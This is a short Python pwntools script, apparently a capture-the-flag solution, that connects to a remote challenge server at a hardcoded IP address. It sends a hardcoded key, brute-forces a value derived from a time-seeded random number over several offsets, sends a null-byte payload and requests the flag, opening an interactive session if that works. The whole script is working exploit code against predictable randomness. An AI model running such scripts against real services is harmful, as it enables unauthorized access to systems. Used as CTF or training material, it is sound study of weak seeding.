from pwn import *
import time, random

context.binary = ELF('./chall_demo', checksec=False)
context.log_level = 'debug'

def get_seed_guess(offset):
    t = int(time.time()) - offset
    random.seed(t)
    rand_val = random.randint(0, 0x7fffffff)
    nhonks = rand_val * 0x59454b5f4f4d4544
    nhonks &= 0xffffffffffffffff
    return nhonks

def try_remote(offset):
    r = remote('194.31.53.241', 13337)

    # Step 1: send key
    r.sendlineafter("key :", "Ot0R!Emu")

    # Step 2: trigger MSG flow
    r.sendlineafter("> ", "MSG")

    # Step 3: send seed guess
    nhonks = get_seed_guess(offset)
    r.sendlineafter("hex order", hex(nhonks))

    # Step 4: send dummy message payload (400 bytes)
    r.sendline(b"\x00" * 400)

    # Try to get the flag
    r.sendlineafter("> ", "GET")
    r.sendlineafter(":", "0x0")

    try:
        response = r.recv(9999)
        print(response.decode())
        if b"[ACK]" in response or b"SECRET" in response:
            print(f"[+] SUCCESS with offset {offset} -> seed = {hex(nhonks)}")
            r.interactive()
            return True
    except:
        pass

    r.close()
    return False

for offset in range(0, 10):
    print(f"[*] Trying seed offset: {offset}")
    if try_remote(offset):
        break
